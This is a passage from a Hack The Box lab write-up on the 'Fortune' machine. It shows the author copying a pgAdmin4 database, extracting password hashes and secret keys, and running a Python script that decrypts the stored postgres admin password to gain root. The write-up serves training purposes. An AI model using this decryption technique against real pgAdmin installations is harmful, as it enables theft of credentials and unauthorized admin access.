drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .
drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..
-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db
-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini
drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
fortune$ 
```
<br> I downloaded it on my machine :
```
root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
```
<br> Then I used `strings` to see if I can get anything interesting :
```
root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
SQLite format 3
indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments

----------------
 Removed Output
----------------

ConfigDB
	ConfigDB
bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
bob@fortune.htb
3	charlie@fortune.htb

----------------
 Removed Output
----------------

9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9
!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?
-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=

----------------
 Removed Output
----------------

8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer<STORAGE_DIR>/.postgresql/postgresql.crt<STORAGE_DIR>/.postgresql/postgresql.key22

----------------
 Removed Output
----------------
```
<br> I got some salted hashes, and most importantly this :
```
postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
```
<br> This is the db administrator's password hash and we know that it's the same as the root password.
<br> `pgadmin` is an open-source software so I searched on `github` for any cryptography related stuff and found this script called [`crypto.py`](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py).
<br> I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from `crypto.py`:
```
#!/usr/bin/python
from __future__ import division
import base64
import hashlib
import os
import six
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.primitives.ciphers.modes import CFB8

padding_string = b'}'
iv_size = AES.block_size // 8


def pad(key):
    """Add padding to the key."""

    if isinstance(key, six.text_type):
        key = key.encode()

    # Key must be maximum 32 bytes long, so take first 32 bytes
    key = key[:32]

    # If key size is 16, 24 or 32 bytes then padding is not required
    if len(key) in (16, 24, 32):
        return key

    # Add padding to make key 32 bytes long
    return key.ljust(32, padding_string)

def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:iv_size]

    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext[iv_size:]) + decryptor.finalize()

ciphertext = raw_input("hash : ")
key = raw_input("key : ")
password = decrypt(ciphertext,key)

print "[*] Password : " + password
```
<br> The only thing left is to give the right key, I tried the other hashes I got from the database as a key and `bob`'s hash worked : 
```
$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
```
```
root@kali:~/Desktop/HTB/boxes/fortune# ./decrypt.py 
hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
root@kali:~/Desktop/HTB/boxes/fortune# 
```
![](/images/hackthebox/fortune/17.png)
<br> And we owned root !
<br> That's it , Feedback is appreciated !
<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : [Hack The Box - LaCasaDePapel](/hack-the-box/lacasadepapel/)
<br> Next Hack The Box write-up : [Hack The Box - Arkham](/hack-the-box/arkham/)
<hr>